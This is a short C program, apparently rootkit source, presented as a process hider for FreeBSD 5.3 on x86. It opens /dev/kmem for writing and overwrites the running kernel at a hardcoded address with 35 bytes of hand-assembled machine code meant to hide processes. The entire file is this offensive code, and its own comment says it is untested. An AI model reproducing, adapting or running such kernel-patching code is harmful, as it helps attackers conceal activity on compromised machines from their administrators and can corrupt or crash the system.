// FreeBSD 5.3-Release (x86) process hider by defaced staff
// ! not tested !

#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

#define OFFSET  0xc06088a5
#define SIZE    35

 char clip_code[] =
 "\x89\xc2" // fixed ops,  edx = eax
 "\x53"
 "\x56"
 "\xe8\x2e\xff\xff\xff"
 "\x83\xc4\x08"
 "\x01\xc2" // fixed ops,  edx += eax

 "\x53"
 "\x56"
 "\xe8\x5a\xff\xff\xff"
 "\x83\xc4\x08"
 "\x01\xd0" // fixed ops,  eax += edx

 // clip_code  FreeBSD 5.3 (x86)  9 bytes  - power nitro source
 "\x6a\x21"
 "\x5a"
 "\x39\x53\x54"
 "\x75\x01"
 "\x40";


int main()
{
  int fd;

  fd = open("/dev/kmem", O_WRONLY);
  if (fd < 0) return 0;

  if (lseek(fd, OFFSET, 0) < 0) return 0;
  write(fd, &clip_code, SIZE);
  close(fd);

  printf("done\n");
  return 0;
}
